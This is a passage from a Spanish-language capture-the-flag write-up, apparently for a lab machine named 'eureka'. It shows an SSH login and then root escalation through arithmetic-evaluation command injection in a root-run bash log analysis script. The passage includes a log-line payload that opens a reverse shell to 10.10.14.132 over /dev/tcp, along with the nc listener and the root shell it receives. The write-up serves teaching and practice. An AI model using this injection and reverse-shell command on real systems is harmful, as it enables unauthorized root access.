## Shell as `miranda-wise`

Las credenciales de miranda nos permiten conectarnos por `ssh` a la máquina víctima

~~~ bash
ssh miranda-wise@10.10.11.66 
miranda-wise@10.10.11.66\'s password:  

Last login: Sun Aug 31 19:33:48 2025 from 10.10.14.132
miranda-wise@eureka:~$ 
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
miranda-wise@eureka:~$ export TERM=xterm # Limpiar la pantalla con Ctrl + L
miranda-wise@eureka:~$ cat user.txt 
dab...
~~~
<br>


# Escalada de Privilegios
---
## Command Injection - Bash `eq` Comparison

Recordemos y analicemos el script de `bash` que habíamos encontrado en la primer enumeración bajo la ruta `/opt`.

El script `log_analyse.sh` contiene la siguiente función que utiliza una condición `if` empleando `-eq`

~~~ bash
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
~~~

El problema surge cuando `if [[ "$existing_code" -eq "$code" ]]` hace la comparación con la variable `$code`, donde es posible ejecutar comandos dentro de esta expresión:

- `-eq` compara dos enteros, esperando expresiones aritméticas
- En este contexto, si `$code` tiene un valor como `x[$(id)]`, se interpreta como una expresión aritmética válida, donde finalmente se ejecuta el comando contenido dentro de `$()`

Sabiendo esto, si hacemos una pequeña prueba con el siguiente comando, comprobaremos que se ejecuta `id` si intentamos simular el comportamiento del script, donde se envía el contenido que espera pero en vez de un código de estado enviamos la expresión maliciosa

~~~ bash
miranda-wise@eureka:~$ echo "HTTP Status: a[$(id)]" | grep -oP 'Status: \K.*'
[uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)]
~~~

Si volvemos a lanzar `pspy` veremos un proceso que ejecuta este script, y se utiliza el archivo de logs del micr-servicio `user-management-service`

~~~ bash
2025/08/30 23:38:01 CMD: UID=0     PID=483200 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
~~~

Si intentamos modificar directamente el archivo `application.log`, nos denegará el acceso debido a permisos

~~~ bash
miranda-wise@eureka:~$ echo 'HTTP Status: a[$(id)]' > /var/www/web/user-management-service/log/application.log

-bash: /var/www/web/user-management-service/log/application.log: Permission denied
~~~

Este conflicto de permisos ocurre porque tenemos permisos de escritura a nivel de grupo (`developers`) sobre el directorio pero no sobre el archivo `application.log`

~~~ bash
miranda-wise@eureka:~$ ls -l /var/www/web/user-management-service/log/application.log
-rw-rw-r-- 1 www-data www-data 17361 Aug 31 19:41 /var/www/web/user-management-service/log/application.log

miranda-wise@eureka:~$ ls -la /var/www/web/user-management-service/log
total 48
drwxrwxr-x 3 www-data developers  4096 Aug 31 15:54 .
drwxrwxr-x 6 www-data developers  4096 Mar 19 22:07 ..
-rw-rw-r-- 1 www-data www-data   17361 Aug 31 19:41 application.log
-rw-rw-r-- 1 www-data www-data    6558 Apr 23 07:36 application.log.2025-04-22.0.gz
-rw-rw-r-- 1 www-data www-data    6571 Aug 31 15:54 application.log.2025-04-23.0.gz
drwxrwxr-x 2 www-data www-data    4096 Apr  9 18:20 archive

miranda-wise@eureka:~$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
~~~


## Root Time

Podemos simplemente renombrar el archivo `application.log` y volver a intentar crearlo y directamente eliminarlo

~~~ bash
miranda-wise@eureka:$ rm -f /var/www/web/user-management-service/log/application.log
~~~

A la hora de inyectar el comando, en mi caso envié directamente una consola a mi máquina por el puerto `443`, pero si quieres puedes asignar `suid` a la `bash` o lo que te convenga

~~~ bash
miranda-wise@eureka:~$ echo 'HTTP Status: a[$(bash -c "bash -i >& /dev/tcp/10.10.14.132/443 0>&1")]' > /var/www/web/user-management-service/log/application.log
~~~

Inmediatamente iniciaremos un listener por el puerto que elegimos para recibir la reverse shell

~~~ bash
nc -lvnp 443                                           
listening on [any] 443 ...
~~~

Al cabo de un minuto, recibiremos la conexión como el usuario `root`

~~~ bash
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.66] 40166
bash: cannot set terminal process group (315936): Inappropriate ioctl for device
bash: no job control in this shell
root@eureka:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@eureka:~#
~~~

Haremos un pequeño tratamiento de la TTY para poder operar con una consola más cómoda

~~~ bash
root@eureka:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@eureka:~# ^Z
[1]  + 520480 suspended  nc -lvnp 443
root@parrot eureka # stty raw -echo;fg                  
[1]  + 520480 continued  nc -lvnp 443
                                     reset xterm
~~~

Ya podremos ver la última flag ubicada en el directorio `/root`

~~~ bash
root@eureka:~# cat root.txt 
f84...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> [!quote] Something opens our wings. Something makes boredom and hurt disappear. Someone fills the cup in front of us: We taste only sacredness.
> — Rumi
{: .notice--info}
